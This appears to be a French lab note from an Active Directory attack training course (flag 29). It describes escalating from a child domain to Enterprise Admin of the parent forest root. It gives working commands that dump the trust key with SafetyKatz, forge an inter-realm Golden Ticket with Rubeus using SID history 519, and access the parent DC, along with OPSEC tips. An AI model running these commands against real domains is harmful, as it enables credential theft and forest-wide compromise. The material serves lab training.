---
flag: 29
machine: Student VM
statut: à faire
technique: Golden Ticket inter-realm + SID history
LO: "[[LO18 - Trust key (Enterprise Admin)]]"
---

# F29 · SID history injecté (Enterprise Admins)

> [!summary] Objectif
> Escalader d'enfant (dcorp) vers parent (moneycorp) en injectant le SID des Enterprise Admins dans un TGT inter-realm forgé avec la clé de trust.

## Contexte
- **Etape attack flow**: post-DA sur `dcorp.moneycorp.local` → traversée intra-forêt vers `moneycorp.local` (EA).
- **Ce qu'on a**: Domain Admin sur `dcorp`, accès à la clé de trust inter-realm (`lsadump::evasive-trust`).
- **Ce qu'on cherche**: le SID injecté dans `SIDHistory` du ticket forgé — celui du groupe **Enterprise Admins** du parent (`S-1-5-21-<moneycorp>-519`).

## Solution

### Etape 1: SID du domaine parent + clé de trust
```powershell
Get-DomainSID moneycorp.local
Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```
→ Voir [[Cheatsheet - Trusts et forêts]] et [[Cheatsheet - Persistence]].

### Etape 2: forger le TGT inter-realm avec SID history 519
```powershell
Rubeus.exe golden /rc4:<trust_key> /netbios:dcorp /sid:<child_sid> /sids:<parent_EA_sid> /user:Administrator /service:krbtgt /target:moneycorp.local /ptt
```
→ Voir [[Cheatsheet - Tickets Kerberos]].

### Etape 3: demander un TGS pour un service du parent et valider EA
```powershell
Rubeus.exe asktgs /service:CIFS/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
ls \\mcorp-dc.moneycorp.local\c$
```

## Reponse

| Element | Valeur |
|---------|--------|
| SID injecté dans SIDHistory | `<A REMPLIR DEPUIS LAB>` (S-1-5-21-<moneycorp_domain_sid>-519) |
| Groupe correspondant | Enterprise Admins (RID 519) |

## Pieges et OPSEC
- Utiliser la clé **RC4** du trust (pas AES) : `Rubeus golden /rc4:` accepte directement la sortie mimikatz.
- `FILTER_SIDS` **non appliqué en intra-forêt** — c'est ce qui rend l'injection SID 519 possible ici (bloqué en inter-forêt).
- Le TGT forgé cible `krbtgt/moneycorp.local` (inter-realm), pas `krbtgt/dcorp...`.
- Trace: 4769 côté `mcorp-dc` pour un TGS demandé par un TGT dont le PAC contient un SID history atypique.

## Refs
- [[Cheatsheet - Trusts et forêts]]
- [[Cheatsheet - Tickets Kerberos]]
- [[Cheatsheet - Persistence]]
- [[LO18 - Trust key (Enterprise Admin)]]
- [[Synthèse - Trusts et forêts]]

[[Flags - Index]] · [[Journal - Index]]
